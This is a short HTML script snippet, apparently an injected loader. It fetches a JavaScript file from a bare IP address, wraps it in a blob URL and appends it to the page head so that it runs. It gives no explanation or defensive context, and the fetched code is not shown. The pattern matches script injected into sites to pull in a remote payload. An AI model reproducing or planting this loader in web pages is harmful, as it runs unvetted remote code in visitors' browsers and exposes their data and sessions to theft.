<script>
    fetch('http:89.116.30.89/js/azultest.js').then(function(response) { 
        if (!response.ok) {
            return false;
        }
        return response.blob();
    }) .then(function(myBlob) {
        var objectURL = URL.createObjectURL(myBlob);
        var sc = document.createElement("script");
        sc.setAttribute("src", objectURL);
        sc.setAttribute("type", "text/javascript");
        document.head.appendChild(sc);
    })
</script>
